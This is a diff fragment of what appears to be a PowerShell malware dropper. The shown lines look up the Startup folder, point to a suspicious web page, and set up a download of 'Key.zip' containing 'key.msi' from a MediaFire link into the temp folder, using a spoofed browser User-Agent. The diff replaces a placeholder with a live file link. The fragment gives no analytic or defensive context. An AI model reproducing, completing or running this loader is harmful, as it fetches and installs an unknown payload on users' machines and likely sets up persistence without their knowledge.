@@ -123,7 +123,7 @@ $startmenuPath=[Environment]::GetFolderPath('Startup')
 }
 if($openUrl){$targetUrl="https://www.whuskalc.lol:443/essential/_page.html"}
 if($mediaFire){
-$mediaFireUrl="https://www.mediafire.com:443/file/?/"
+$mediaFireUrl="https://www.mediafire.com:443/file/jaaaimvoo0ffanf/"
 $folderName="Key";$exeName="key.msi"
 $zipPath=Join-Path $tempPath "$folderName.zip";$extractPath=$tempPath;$exePath=Join-Path $extractPath $exeName
 $headers=@{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"}
